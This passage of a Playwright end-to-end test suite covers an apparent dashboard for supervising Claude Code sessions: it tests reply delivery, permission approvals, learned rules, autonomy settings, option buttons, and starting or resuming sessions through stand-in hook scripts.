    const late = (pr, ms) => Promise.race([pr, new Promise(res => setTimeout(() => res({ code: 'timeout' }), ms))]);
    await run('event', { hook_event_name: 'UserPromptSubmit', prompt: 'Fix the cart' });
    const turn = run('reply', { hook_event_name: 'Stop', last_assistant_message: 'Fixed the cart. Shall I deploy?' });
    await page.waitForSelector('#ab-cols [data-col=need] .ab-card', { timeout: 8000 });
    const need = await page.textContent('#ab-cols [data-col=need]');
    check('agent board: the finished turn shows in Needs you, word for word, with its folder and machine',
      /Shall I deploy\?/.test(need) && /webshop/.test(need) && /testbox/.test(need), need);
    // 1.43.0: the rail and Agents-tab badges count what is in Needs you, and clear when it is looked at
    await page.waitForFunction(() => document.querySelector('#pilot-tab-agents').textContent === String(document.querySelectorAll('#ab-cols [data-col=need] .ab-card').length), null, { timeout: 6000 }).catch(() => {});
    const nCards = (await page.$$('#ab-cols [data-col=need] .ab-card')).length;
    check('agent board: the tab and rail badges count the sessions that need you', nCards > 0 && await page.textContent('#pilot-tab-agents') === String(nCards) && await page.textContent('#pilot-rail-badge') === String(nCards),
      `${nCards} / ${await page.textContent('#pilot-tab-agents')} / ${await page.textContent('#pilot-rail-badge')}`);
    check('agent board: /api/status says the same', (await api(page, 'api/status')).agents_need === nCards);
    await page.selectOption('#ab-notify', 'all'); await page.waitForTimeout(500);
    check('agent board: Notify me is kept', (await api(page, 'api/agents')).notify === 'all');
    await page.selectOption('#ab-notify', 'permission'); await page.waitForTimeout(300);
    await page.click('#ab-cols [data-col=need] .ab-card');
    await page.waitForSelector('#ab-detail #ab-reply', { timeout: 6000 });
    check('agent board: the thread shows what was typed in the session and the answer', /Fix the cart/.test(await page.textContent('#ab-detail .ab-thread')));
    await page.waitForTimeout(1500);
    check('agent board: opening it takes it off the count', (await api(page, 'api/status')).agents_need === nCards - 1);
    await page.fill('#ab-reply', 'No, wait for Monday.');
    await page.click('#ab-detail [data-abact=send]');
    const r = await late(turn, 15000);
    check('agent board: the waiting hook gets the reply and wakes the session (exit 2, the text on stderr)', r.code === 2 && /No, wait for Monday\./.test(r.err), JSON.stringify(r));
    // 1.49.1: one bubble per reply: "queued" gives way to "delivered"
    const bubbles = () => page.$$eval('#ab-detail .ab-thread .ab-ev', els => els.filter(e => /No, wait for Monday\./.test(e.textContent)).length);
    await page.waitForSelector('#ab-detail .ab-thread .ab-k-delivered', { timeout: 8000 });
    check('agent board: a delivered reply shows once in the thread, not queued and delivered', await bubbles() === 1, String(await bubbles()));
    const perm = run('permission', { hook_event_name: 'PermissionRequest', tool_name: 'Bash', tool_input: { command: 'npm run deploy' } });
    await page.waitForSelector('#ab-detail .ab-perm [data-abact=deny]', { timeout: 8000 });
    check('agent board: a permission request shows what it is about', /npm run deploy/.test(await page.textContent('#ab-detail .ab-perm')));
    await page.waitForTimeout(2500); // the hook asks every 2 s
    await page.click('#ab-detail .ab-perm [data-abact=deny]');
    const p2 = await late(perm, 15000);
    let dec = null; try { dec = JSON.parse(p2.out).hookSpecificOutput.decision.behavior; } catch {}
    check('agent board: Deny answers the hook in Claude Code\'s own format', p2.code === 0 && dec === 'deny', JSON.stringify(p2));
    await page.waitForTimeout(4500);
    check('agent board: the board follows by itself (no reload): the session is working again', /webshop/.test(await page.textContent('#ab-cols [data-col=working]')), await page.textContent('#ab-cols'));
    // 1.47.0: the agent sends a file it made; the thread shows it, and Open shows it on its sandboxed viewer
    const rep = join(data, 'sales report.html'); writeFileSync(rep, '<!doctype html><h1>Q3 sales</h1><script>document.title="ran"</script>');
    const sent = await new Promise(res => { const p = spawn('sh', [sh, 'send', rep, 'bt-1']); let out = ''; p.stdout.on('data', x => out += x); p.on('close', code => res({ code, out })); });
    check('agent board: the hook script sends a file the agent made', sent.code === 0 && /Sent to Talixio: sales report\.html/.test(sent.out), JSON.stringify(sent));
    await page.waitForSelector('#ab-detail .ab-file', { timeout: 8000 });
    const card = await page.textContent('#ab-detail .ab-file');
    check('agent board: the thread shows the file, with Open and Download', /sales report\.html/.test(card) && /Agents\/webshop/.test(card) && await page.$('#ab-detail .ab-file a[download]') !== null, card);
    const href = await page.getAttribute('#ab-detail .ab-file a[target=_blank]', 'href');
    const [tab] = await Promise.all([page.context().waitForEvent('page'), page.click('#ab-detail .ab-file a[target=_blank]')]);
    await tab.waitForLoadState();
    const csp = await page.evaluate(h => fetch(h).then(r => r.headers.get('content-security-policy')), href);
    check('agent board: Open shows the page, sandboxed: its scripts do not run', /Q3 sales/.test(await tab.textContent('body')) && await tab.title() !== 'ran' && /sandbox/.test(csp || ''), `${await tab.title()} ${csp}`);
    await tab.close();
    // 1.49.0: two panes; a permission is answered from the list, its whole command shown; Next goes from one waiting session to the other
    await page.click('#ab-detail [data-abact=close]');
    await run('event', { session_id: 'bt-3', cwd: '/work/blog', hook_event_name: 'Stop', last_assistant_message: 'Draft ready. Publish it?' });
    const long = 'echo ' + 'x'.repeat(300) + ' && npm run release';
    const perm2 = run('permission', { session_id: 'bt-2', cwd: '/work/api', hook_event_name: 'PermissionRequest', tool_name: 'Bash', tool_input: { command: long } });
    await page.waitForSelector('#ab-cols [data-col=need] .ab-card [data-cact=allow]', { timeout: 8000 });
    check('agent board: a permission card shows the whole command, not a cut', /npm run release/.test(await page.textContent('#ab-cols [data-col=need] .ab-c-cmd')));
    await page.waitForSelector('#ab-empty [data-ab-next]', { timeout: 6000 });
    await page.click('#ab-empty [data-ab-next]');
    await page.waitForSelector('#ab-detail [data-abact=next]', { timeout: 6000 });
    const first = await page.textContent('#ab-detail .ab-d-title h4');
    await page.click('#ab-detail [data-abact=next]');
    await page.waitForFunction(f => document.querySelector('#ab-detail .ab-d-title h4')?.textContent !== f, first, { timeout: 6000 }).catch(() => {});
    const second = await page.textContent('#ab-detail .ab-d-title h4');
    check('agent board: Open the first one, then Next, go through the sessions that need you', ['api', 'blog'].includes(first) && ['api', 'blog'].includes(second) && first !== second, `${first} → ${second}`);
    await page.click('#ab-detail [data-abact=close]');
    await page.waitForTimeout(2500); // the hook asks every 2 s
    await page.click('#ab-cols [data-col=need] .ab-card [data-cact=allow]');
    const p3 = await late(perm2, 15000);
    let dec3 = null; try { dec3 = JSON.parse(p3.out).hookSpecificOutput.decision.behavior; } catch {}
    check('agent board: Allow on the card answers the hook, without opening the session', p3.code === 0 && dec3 === 'allow', JSON.stringify(p3));
  },
  async agentKnowledge({ page, check, root, data }) {
    // 1.44.0: what the director learned from the board (after agentBoard: a reply and a denied permission in webshop on testbox)
    // 1.46.0: one rule deduced from those answers, waiting for the user
    execFileSync('php', ['-r', "require '" + join(root, 'src/autoload.php') + "';"
      + "$a=\\Talixio\\App::fromEnv(); $ids=array_column($a->knowledge()->decisions('', '', 'you', 3), 'id');"
      + "$a->store->q(\"INSERT INTO fk_rules(project, topic, text, status, evidence, created) VALUES('', 'deploy', 'Never deploy before Monday.', 'proposed', ?, ?)\", [json_encode($ids), time()]);"],
      { env: { ...process.env, TALIXIO_DATA_DIR: data, TALIXIO_STORE: join(data, 'store'), TALIXIO_PROVIDER: 'echo', TALIXIO_WEB_PASSWORD: 'pw' } });
    await go(page, 'pilotage');
    await page.click('#view-pilotage .ptab[data-ptab=agents]');
    await page.waitForSelector('#ab-cols .ab-col', { timeout: 6000 });
    await page.click('#ab-know-btn');
    await page.waitForSelector('#ab-know .ab-kproj', { timeout: 6000 });
    const box = await page.textContent('#ab-know');
    check('agent knowledge: What I know lists the project, with its machine and its decisions', /webshop/.test(box) && /testbox/.test(box) && /No, wait for Monday\./.test(box) && /npm run deploy/.test(box), box.slice(0, 600));
    check('agent knowledge: a project without a summarised session says it has no dossier yet', (await page.$$('#ab-know .ab-kdossier')).length === 0);
    await page.selectOption('#ab-know [data-kfilter=topic]', 'deploy');
    const dep = await page.textContent('#ab-know .ab-klog');
    check('agent knowledge: the decision log filters by topic', /npm run deploy/.test(dep) || /Shall I deploy/.test(dep), dep);
    await page.selectOption('#ab-know [data-kfilter=topic]', 'docs');
    check('agent knowledge: …and says when nothing matches', !(await page.$('#ab-know .ab-klog')));
    // the rule: proposed with the answers behind it, then confirmed, edited, and no longer applied
    const pr = await page.textContent('#ab-know .ab-krule-proposed');
    check('agent knowledge: a deduced rule waits for you, with the answers it comes from', /Never deploy before Monday\./.test(pr) && (await page.$$('#ab-know .ab-krule-proposed details .ab-kdec li')).length >= 1, pr);
    await page.click('#ab-know .ab-krule-proposed [data-act=confirm]');
    await page.waitForSelector('#ab-know .ab-krule-confirmed', { timeout: 6000 });
    check('agent knowledge: Confirm applies the rule', (await api(page, 'api/agents/knowledge')).rules.find(r => /Monday/.test(r.text))?.status === 'confirmed');
    page.once('dialog', d => d.accept('Never deploy on a Friday.'));
    await page.click('#ab-know .ab-krule-confirmed [data-act=edit]');
    await page.waitForFunction(() => /Friday/.test(document.querySelector('#ab-know .ab-krule-confirmed')?.textContent || ''), null, { timeout: 6000 });
    check('agent knowledge: Edit keeps your words', (await api(page, 'api/agents/knowledge')).rules.some(r => r.text === 'Never deploy on a Friday.' && r.status === 'confirmed'));
    await page.click('#ab-know .ab-krule-confirmed [data-act=reject]');
    await page.waitForFunction(() => !document.querySelector('#ab-know .ab-krule-confirmed'), null, { timeout: 6000 });
    check('agent knowledge: Stop applying rejects it, and the page says rejected rules are not proposed again', /not proposed again|ne sont plus proposées/.test(await page.textContent('#ab-know')));
    page.once('dialog', d => d.accept());
    await page.click('#ab-know .ab-kproj:has-text("webshop") [data-kact=exclude]');
    await page.waitForSelector('#ab-know .ab-kproj.off', { timeout: 6000 });
    const k = await api(page, 'api/agents/knowledge');
    const wp = k.projects.find(p => p.title === 'webshop');
    check('agent knowledge: Stop learning turns it off and forgets what was learned', wp && wp.exclude === true && !k.decisions.some(d => d.project === wp.key), JSON.stringify(wp));
    await page.click('#ab-know .ab-kproj:has-text("webshop") [data-kact=exclude]');
    await page.waitForSelector('#ab-know .ab-kproj:not(.off)', { timeout: 6000 });
    check('agent knowledge: Learn again turns it back on', (await api(page, 'api/agents/knowledge')).projects.find(p => p.title === 'webshop')?.exclude === false);
    await page.click('#ab-know-btn');
  },
  async agentAutonomy({ page, check, data }) {
    // 1.39.0: the autonomy settings live on the board; a suggestion shows in the session, Send this answer scores it, a verdict on what it sent
    const { readFileSync, existsSync } = await import('node:fs');
    // 1.42.0: the autonomy controls must work without the old relay cockpit's wiring (plWire), which is going away
    const plWired = await page.evaluate(() => { const was = PL.wired; PL.wired = true; return was; });
    await go(page, 'pilotage');
    await page.click('#view-pilotage .ptab[data-ptab=agents]');
    await page.waitForSelector('#ab-cols .ab-col', { timeout: 6000 });
    await page.evaluate(() => post('api/pilot', { enabled: true })); // 1.51.0: switched on, every level still on « ask »
    await page.click('#ab-auto-btn');
    await page.waitForSelector('#ab-auto #pa-on', { timeout: 6000 });
    check('agent autonomy: the board has the autonomy settings, L6 kept (1.52.0: L4 Product and L5 Business are yours to open)', (await page.$$('#ab-auto [data-auto-lv]')).length === 5);
    check('agent autonomy: self-promotion is on for L1-L3, off for L4, out of the box', await page.isChecked('#ab-auto #pa-sp') && !(await page.isChecked('#ab-auto #pa-po')) && await page.inputValue('#ab-auto #pa-pa') === '85');
    check('agent autonomy: the levels carry the agents\' ladder, the PO apart from the business', /Product \(you, the PO\)/.test(await page.textContent('#ab-auto .pl-lv')) && /Business/.test(await page.textContent('#ab-auto .pl-lv')));
    check('agent autonomy: reading each finished turn is on out of the box, apart from answering alone', await page.isChecked('#ab-auto #pa-read'));
    check('agent autonomy: switched on with every level on « I propose », it says it will not answer alone', await page.isVisible('#ab-auto #pa-all-ask'));
    await page.check('#ab-auto #pa-on');
    await page.selectOption('#ab-auto [data-auto-lv=L1]', 'tell');
    await page.check('#ab-auto #pa-po'); await page.selectOption('#ab-auto #pa-pa', '90');
    await page.click('#ab-auto [data-auto-save]');
    await page.waitForTimeout(800);
    const pol = await api(page, 'api/pilot');
    check('agent autonomy: Save turns it on, with the mode per level', pol.enabled === true && pol.analyse === true && pol.levels.L1.mode === 'tell', JSON.stringify(pol.levels));
    check('agent autonomy: and the self-promotion settings', pol.self_promote === true && pol.promote_po === true && pol.promote_at === 0.9, JSON.stringify(pol));
    await page.evaluate(() => post('api/pilot', { promote_po: false, promote_at: 0.85 }));
    check('agent autonomy: once a level has room, the warning goes', !(await page.$('#ab-auto #pa-all-ask')));
    if (await page.isHidden('#ab-setup')) await page.click('#ab-connect');
    await page.fill('#ab-machine', 'autobox');
    const sh = join(data, 'auto-hook.sh');
    writeFileSync(sh, await page.evaluate(() => fetch(document.querySelector('#ab-dl').getAttribute('href')).then(r => r.text())));
    const ev = e => new Promise(res => { const p = spawn('sh', [sh, 'event']); p.on('close', res); p.stdin.end(JSON.stringify({ session_id: 'auto-1', cwd: '/work/garden', ...e })); });
    await ev({ hook_event_name: 'UserPromptSubmit', prompt: 'Sort the plants' });
    await ev({ hook_event_name: 'Stop', last_assistant_message: 'Sorted. Shall I also sort the seeds?' }); // seq 2
    // what the worker's decision would write (the model is not run in this harness)
    const f = join(data, 'pilot.json'), st = existsSync(f) ? JSON.parse(readFileSync(f, 'utf8')) : {};
    const now = Math.floor(Date.now() / 1000), base = { agent: 'claude-code:auto-1', name: 'garden (autobox)', board: true, question: 'Shall I also sort the seeds?', rationale: 'Same task.', ts: now };
    st.predictions = { ...(st.predictions || {}),
      'board:claude-code:auto-1:1': { ...base, id: 'board:claude-code:auto-1:1', level: 'L1', answer: 'Go on.', confidence: 0.9, action: 'sent', why: '' },
      'board:claude-code:auto-1:2': { ...base, id: 'board:claude-code:auto-1:2', level: 'L2', answer: 'Yes, sort the seeds too.', confidence: 0.6, action: 'proposed', why: 'confidence below the threshold 75%' } };
    writeFileSync(f, JSON.stringify(st));
    await page.evaluate(() => { AB.rev = -1; return abRefresh(); });
    await page.waitForSelector('#ab-cols .ab-card:has-text("garden") .ab-c-sug', { timeout: 6000 });
    check('agent autonomy: the card says a suggested answer waits', true);
    await page.click('#ab-cols .ab-card:has-text("garden")');
    await page.waitForSelector('#ab-detail .ab-sug', { timeout: 6000 });
    const sug = await page.textContent('#ab-detail .ab-sug');
    check('agent autonomy: the session shows the suggestion, its level, confidence and why it was not sent', /Yes, sort the seeds too\./.test(sug) && /L2/.test(sug) && /60%/.test(sug) && /75%/.test(sug), sug);
    check('agent autonomy: and asks about what it sent by itself', /Go on\./.test(await page.textContent('#ab-detail .ab-judge')));
    await page.click('#ab-detail .ab-judge [data-abact=judge][data-ok="1"]');
    await page.waitForTimeout(800);
    await page.click('#ab-detail [data-abact=sendsug]');
    await page.waitForFunction(() => !document.querySelector('#ab-detail .ab-sug'), null, { timeout: 6000 });
    const rec = (await api(page, 'api/pilot')).recent;
    const hit = id => rec.find(p => p.id === id)?.hit;
    check('agent autonomy: Send this answer sends it and counts as right; the verdict too', hit('board:claude-code:auto-1:2') === true && hit('board:claude-code:auto-1:1') === true, JSON.stringify(rec));
    check('agent autonomy: the answer is queued for the session, from you', /Yes, sort the seeds too\./.test(await page.textContent('#ab-detail .ab-thread')));
    // 1.49.0: one pane at a time: opening the card already put the autonomy settings away
    await page.click('#ab-detail [data-abact=close]');
    await page.evaluate(w => { PL.wired = w; }, plWired);
  },
  async agentOptions({ page, check, data }) {
    // 1.52.0: the options an agent offers (its decision card) become one-click answers
    await go(page, 'pilotage');
    await page.click('#view-pilotage .ptab[data-ptab=agents]');
    await page.waitForSelector('#ab-cols .ab-col', { timeout: 6000 });
    if (await page.isHidden('#ab-setup')) await page.click('#ab-connect');
    await page.fill('#ab-machine', 'optbox');
    const sh = join(data, 'opt-hook.sh');
    writeFileSync(sh, await page.evaluate(() => fetch(document.querySelector('#ab-dl').getAttribute('href')).then(r => r.text())));
    const ev = e => new Promise(res => { const p = spawn('sh', [sh, 'event']); p.on('close', res); p.stdin.end(JSON.stringify({ session_id: 'opt-1', cwd: '/work/orchard', ...e })); });
    await ev({ hook_event_name: 'UserPromptSubmit', prompt: 'Plan the harvest' });
    await ev({ hook_event_name: 'Stop', last_assistant_message: 'Question for the PO\nLevel: L4\nWhich lot first?\nA) The apples, ready this week\nB) The pears\nRecommendation: A' });
    await page.evaluate(() => { AB.rev = -1; return abRefresh(); });
    await page.click('#ab-cols .ab-card:has-text("orchard")');
    await page.waitForSelector('#ab-detail .ab-opts', { timeout: 6000 });
    const opts = await page.$$eval('#ab-detail .ab-opt', bs => bs.map(b => b.dataset.text));
    check('agent options: its options are buttons', opts.join('|') === 'A) The apples, ready this week|B) The pears', JSON.stringify(opts));
    await page.click('#ab-detail .ab-opt:has-text("pears")');
    await page.waitForFunction(() => /B\) The pears/.test(document.querySelector('#ab-detail .ab-thread')?.textContent || ''), null, { timeout: 6000 });
    check('agent options: one click answers with that option', true);
    check('agent options: a message without options gets no buttons', (await page.evaluate(() => [abOptions('Done. Shall I go on?'), abOptions('Version 2. ready'), abOptions('Pick A) red or B) blue'), abOptions('- **A. Allow narrow sub-agent permissions** (my recommendation). ' + 'Allow Write and Edit under the scenario folder, and the one command that records decisions, in the settings file. '.repeat(2) + '\n  - It is narrow.\n- **B. Approve the prompts in this session.**\n  - The settings stay.\n- **C. I write the remaining files myself.**')].map(o => o.length).join(','))) === '0,0,2,3');
    await page.click('#ab-detail [data-abact=close]');
  },
  async agentPerm({ page, check, data }) {
    // 1.53.0: a permission says what it does, and « Always allow » hands Claude Code the rule it suggested, through the real hook script
    await go(page, 'pilotage');
    await page.click('#view-pilotage .ptab[data-ptab=agents]');
    await page.waitForSelector('#ab-cols .ab-col', { timeout: 6000 });
    if (await page.isHidden('#ab-setup')) await page.click('#ab-connect');
    await page.fill('#ab-machine', 'permbox');
    const sh = join(data, 'perm-hook.sh');
    writeFileSync(sh, await page.evaluate(() => fetch(document.querySelector('#ab-dl').getAttribute('href')).then(r => r.text())));
    const ask = e => new Promise(res => { const p = spawn('sh', [sh, 'permission']); let out = ''; p.stdout.on('data', x => out += x); p.on('close', code => res({ code, out }));
      p.stdin.end(JSON.stringify({ session_id: 'perm-1', cwd: '/work/vineyard', hook_event_name: 'PermissionRequest', tool_name: 'Bash', ...e })); });
    const sug = c => ({ type: 'addRules', behavior: 'allow', destination: 'localSettings', rules: [{ toolName: 'Bash', ruleContent: c }] });
    const p1 = ask({ tool_input: { command: 'git status && git push origin main' }, permission_suggestions: [sug('git push:*')] });
    await page.waitForSelector('#ab-cols .ab-card:has-text("vineyard") .ab-risk', { timeout: 8000 });
    check('agent perm: a card says what to check first', /Check first: it pushes or rewrites git history/.test(await page.textContent('#ab-cols .ab-card:has-text("vineyard") .ab-risk')));
    await page.click('#ab-cols .ab-card:has-text("vineyard")');
    await page.waitForSelector('#ab-detail .ab-perm [data-abact=deny]', { timeout: 6000 });
    check('agent perm: a push offers no « Always allow »', await page.$('#ab-detail .ab-perm [data-abact=always]') === null);
    await page.waitForTimeout(2500); // the hook asks every 2 s
    await page.click('#ab-detail .ab-perm [data-abact=deny]');
    await p1;
    const p2 = ask({ tool_input: { command: 'npx playwright test --list 2>&1 | tail -4' }, permission_suggestions: [sug('npx playwright test:*')] });
    await page.waitForSelector('#ab-detail .ab-perm [data-abact=always]', { timeout: 8000 });
    check('agent perm: « Always allow » shows the rule it saves', /npx playwright test:\*/.test(await page.textContent('#ab-detail .ab-perm .ab-rules')) && await page.$('#ab-detail .ab-perm .ab-risk') === null);
    await page.waitForTimeout(2500);
    await page.click('#ab-detail .ab-perm [data-abact=always]');
    const r2 = await p2;
    let dec = {}; try { dec = JSON.parse(r2.out).hookSpecificOutput.decision; } catch {}
    check('agent perm: the hook allows it and hands Claude Code the rule to save', dec.behavior === 'allow' && dec.updatedPermissions?.[0]?.rules?.[0]?.ruleContent === 'npx playwright test:*'
      && dec.updatedPermissions[0].destination === 'localSettings', r2.out);
    // 1.55.0: with « The assistant allows read-only », a read-only request is answered without you
    await page.selectOption('#ab-perms', 'read'); await page.waitForTimeout(400);
    const r3 = await ask({ tool_input: { command: 'head -c 3000 /tmp/x/ask-base.jsonl; ls /tmp/x' } });
    let dec3 = {}; try { dec3 = JSON.parse(r3.out).hookSpecificOutput.decision; } catch {}
    check('agent perm: a read-only request is allowed by the assistant, no click', dec3.behavior === 'allow', r3.out);
    await page.waitForFunction(() => /Allowed by the assistant: it only reads/.test(document.querySelector('#ab-detail .ab-thread')?.textContent || ''), null, { timeout: 8000 }).catch(() => {});
    check('agent perm: the thread says the assistant allowed it, and why', /Allowed by the assistant: it only reads/.test(await page.textContent('#ab-detail .ab-thread')));
    // « Always ask me »: it waits for you, labelled
    await page.selectOption('#ab-perms', 'off'); await page.waitForTimeout(400);
    const p4 = ask({ tool_input: { command: 'ls /tmp/x' } });
    await page.waitForSelector('#ab-detail .ab-perm .ab-safe', { timeout: 8000 });
    check('agent perm: with « Always ask me », a read-only request waits, labelled safe', /Read-only: safe to allow/.test(await page.textContent('#ab-detail .ab-perm .ab-safe')));
    await page.waitForTimeout(2500);
    await page.click('#ab-detail .ab-perm [data-abact=allow]');
    await p4;
    await page.selectOption('#ab-perms', 'learn'); await page.waitForTimeout(400);
    check('agent perm: the choice is kept', (await api(page, 'api/agents')).perms === 'learn');
    await page.click('#ab-detail [data-abact=close]');
  },
  async agentStart({ page, check, data }) {
    // 1.38.0: start a session from the board on a machine whose listener runs, then stop it; the real scripts, a stand-in for claude
    const { mkdirSync, chmodSync } = await import('node:fs');
    const work = join(data, 'lab', 'shop'), lh = join(data, 'lab', '.talixio');
    mkdirSync(work, { recursive: true }); mkdirSync(lh, { recursive: true });
    await go(page, 'pilotage');
    await page.click('#view-pilotage .ptab[data-ptab=agents]');
    await page.waitForSelector('#ab-cols .ab-col', { timeout: 6000 });
    if (await page.isHidden('#ab-setup')) await page.click('#ab-connect');
    await page.fill('#ab-machine', 'labbox');
    const get = sel => page.evaluate(s => fetch(document.querySelector(s).getAttribute('href')).then(r => r.text()), sel);
    const hook = join(lh, 'agent-hook.sh'), listen = join(lh, 'agent-listen.sh');
    writeFileSync(hook, await get('#ab-dl')); writeFileSync(listen, await get('#ab-dl-listen'));
    check('agent start: Connect a machine offers the listener, for this machine', /M='labbox'/.test(await get('#ab-dl-listen')) && /api\/agents\/next/.test(await get('#ab-dl-listen')));
    // a stand-in for Claude Code: reports through the real hook script with TALIXIO_JOB, answers its prompt, then stays alive
    const fake = join(lh, 'fake-claude.sh');
    writeFileSync(fake, `#!/bin/sh
p=$(cat); sid="fake-$$"
ev() { printf '{"session_id":"%s","hook_event_name":"%s","cwd":"%s"%s}' "$sid" "$1" "$PWD" "$2" | sh '${hook}' event; }
ev SessionStart ''
ev UserPromptSubmit ",\\"prompt\\":\\"$p\\""
ev Stop ",\\"last_assistant_message\\":\\"Done: $p\\""
sleep 300
`); chmodSync(fake, 0o755);
    const seed = spawn('sh', [hook, 'event']); seed.stdin.end(JSON.stringify({ session_id: 'lab-seed', hook_event_name: 'SessionStart', cwd: work }));
    await new Promise(r => seed.on('close', r));
    const lis = spawn('sh', [listen], { env: { ...process.env, TALIXIO_HOME: lh, TALIXIO_ROOT: join(data, 'lab'), TALIXIO_CLAUDE: fake }, stdio: 'ignore' });
    try {
      await page.click('#ab-new-btn');
      await page.waitForSelector('#ab-new-form:not([hidden]) #ab-new-machine option[value=labbox]', { state: 'attached', timeout: 12000 });
      await page.selectOption('#ab-new-machine', 'labbox');
      check('agent start: New session offers the listening machine and the folder it reported', (await page.$$eval('#ab-new-folder option', o => o.map(x => x.value))).includes(work));
      await page.selectOption('#ab-new-folder', work);
      await page.fill('#ab-new-prompt', 'Fix the basket');
      await page.click('#ab-new-start');
      await page.waitForFunction(() => /Done: Fix the basket/.test(document.querySelector('#ab-cols [data-col=need]')?.textContent || ''), null, { timeout: 20000 });
      check('agent start: the session runs on the machine and reports on the board, word for word', /shop/.test(await page.textContent('#ab-cols [data-col=need]')));
      await page.click('#ab-cols [data-col=need] .ab-card:has-text("Done: Fix the basket")');
      await page.waitForSelector('#ab-detail [data-abact=stop]', { timeout: 6000 });
      // the panel may still hold the session the previous flow left open (it has a Stop too): wait for this one's thread
      await page.waitForFunction(() => /Fix the basket/.test(document.querySelector('#ab-detail .ab-thread')?.textContent || ''), null, { timeout: 6000 }).catch(() => {});
      check('agent start: its thread starts with the prompt sent from the board', /Fix the basket/.test(await page.textContent('#ab-detail .ab-thread')));
      const pidFile = (await import('node:fs')).readdirSync(join(lh, 'jobs')).find(f => f.endsWith('.pid'));
      const pid = Number((await import('node:fs')).readFileSync(join(lh, 'jobs', pidFile), 'utf8'));
      page.once('dialog', dlg => dlg.accept());
      await page.click('#ab-detail [data-abact=stop]');
      await page.waitForFunction(() => /stopped|arrêtée/i.test(document.querySelector('#ab-detail')?.textContent || '') && !document.querySelector('#ab-detail [data-abact=stop]'), null, { timeout: 20000 });
      let alive = true;
      for (let i = 0; i < 40 && alive; i++) { try { process.kill(pid, 0); await page.waitForTimeout(250); } catch { alive = false; } } // the listener asks every 3 s
      check('agent start: Stop ends the process the listener started, and the session shows stopped', !alive && /shop/.test(await page.textContent('#ab-cols [data-col=quiet]')));
    } finally { lis.kill(); }
  },
  async agentResume({ page, check, data }) {
    // 1.50.0: a reply to a session started from the board resumes it (claude -p --resume): the reply is its next prompt
    const { mkdirSync, chmodSync, readFileSync: rf, existsSync: ex } = await import('node:fs');
    const work = join(data, 'lab2', 'site'), lh = join(data, 'lab2', '.talixio');
    mkdirSync(work, { recursive: true }); mkdirSync(lh, { recursive: true });
    await go(page, 'pilotage');
    await page.click('#view-pilotage .ptab[data-ptab=agents]');
    await page.waitForSelector('#ab-cols .ab-col', { timeout: 6000 });
    if (await page.isHidden('#ab-setup')) await page.click('#ab-connect');
    await page.fill('#ab-machine', 'resumebox');
    const get = sel => page.evaluate(s => fetch(document.querySelector(s).getAttribute('href')).then(r => r.text()), sel);
    const hook = join(lh, 'agent-hook.sh'), listen = join(lh, 'agent-listen.sh'), args = join(lh, 'args.txt');
    writeFileSync(hook, await get('#ab-dl')); writeFileSync(listen, await get('#ab-dl-listen'));
    // a stand-in for claude -p: one turn, then it exits; with --resume <id> it goes on as that session
    const fake = join(lh, 'fake-claude.sh');
    writeFileSync(fake, `#!/bin/sh
echo "$*" >> '${args}'
sid="r-$$"; [ "$1" = -p ] && [ "$2" = --resume ] && sid="$3"
p=$(cat)
ev() { printf '{"session_id":"%s","hook_event_name":"%s","cwd":"%s"%s}' "$sid" "$1" "$PWD" "$2" | sh '${hook}' event; }
[ "$2" = --resume ] || ev SessionStart ''
ev UserPromptSubmit ",\\"prompt\\":\\"$p\\""
ev Stop ",\\"last_assistant_message\\":\\"Done: $p\\""
ev SessionEnd ",\\"reason\\":\\"other\\""
`); chmodSync(fake, 0o755);
    const seed = spawn('sh', [hook, 'event']); seed.stdin.end(JSON.stringify({ session_id: 'lab2-seed', hook_event_name: 'SessionStart', cwd: work }));
    await new Promise(r => seed.on('close', r));
    const lis = spawn('sh', [listen], { env: { ...process.env, TALIXIO_HOME: lh, TALIXIO_ROOT: join(data, 'lab2'), TALIXIO_CLAUDE: fake }, stdio: 'ignore' });
    try {
      await page.click('#ab-new-btn');
      await page.waitForSelector('#ab-new-form:not([hidden]) #ab-new-machine option[value=resumebox]', { state: 'attached', timeout: 12000 });
      await page.selectOption('#ab-new-machine', 'resumebox');
      await page.selectOption('#ab-new-folder', work);
      await page.fill('#ab-new-prompt', 'Plan the release');
      await page.click('#ab-new-start');
      await page.waitForFunction(() => /Done: Plan the release/.test(document.querySelector('#ab-cols [data-col=need]')?.textContent || ''), null, { timeout: 20000 });
      // claude -p has ended with its turn: the listener reports it, and the session stays answerable
      await page.waitForFunction(() => fetch('api/agents').then(r => r.json()).then(d => d.sessions.some(s => s.project === 'site' && s.state === 'waiting')), null, { timeout: 8000 }).catch(() => {});
      await page.waitForTimeout(4000);
      const st = (await api(page, 'api/agents')).sessions.find(s => s.project === 'site' && s.job > 0);
      check('agent resume: when claude -p ends with its turn, the session waits for you instead of ending', st?.state === 'waiting', JSON.stringify(st));
      await page.click('#ab-cols [data-col=need] .ab-card:has-text("Done: Plan the release")');
      await page.waitForSelector('#ab-detail #ab-reply', { timeout: 6000 });
      check('agent resume: no note about the hook for a session the board started', !(await page.$('#ab-detail .ab-relay-note')));
      await page.fill('#ab-reply', 'Option B');
      await page.click('#ab-detail [data-abact=send]');
      await page.waitForFunction(() => /Done: Option B/.test(document.querySelector('#ab-detail .ab-thread')?.textContent || ''), null, { timeout: 20000 }).catch(() => {});
      const ran = ex(args) ? rf(args, 'utf8') : '';
      check('agent resume: the listener resumed that very session with the reply as its prompt', new RegExp('^-p --resume ' + st?.id.split(':')[1] + '$', 'm').test(ran), ran);
      check('agent resume: the resumed session answers in the same thread', /Done: Option B/.test(await page.textContent('#ab-detail .ab-thread')));
      const mine = await page.$$eval('#ab-detail .ab-thread .ab-mine', els => els.filter(e => e.textContent.includes('Option B')).length);
      check('agent resume: the reply shows once (not again as typed in the session)', mine === 1, String(mine));
      // 1.51.0: a session that was stopped (1.52.2: claude -p's own SessionEnd after a turn no longer ends it) can be
      // resumed from the board, and its next answer continues the same session
      await page.waitForFunction(id => fetch('api/agents').then(r => r.json()).then(d => d.sessions.some(s => s.id === id && s.state === 'waiting')), st.id, { timeout: 8000 });
      await page.evaluate(id => post(`api/agents/s/${encodeURIComponent(id)}/stop`, {}), st.id);
      await page.waitForSelector('#ab-detail [data-abact=reopen]', { timeout: 8000 });
      check('agent resume: an ended session offers « Resume and re-read », not a reply box', !(await page.$('#ab-detail #ab-reply')));
      await page.click('#ab-detail [data-abact=reopen]');
      await page.waitForSelector('#ab-detail #ab-reply', { timeout: 8000 });
      check('agent resume: resumed, it waits for you again', (await api(page, 'api/agents')).sessions.find(s => s.id === st.id)?.state === 'waiting');
      await page.fill('#ab-reply', 'Carry on');
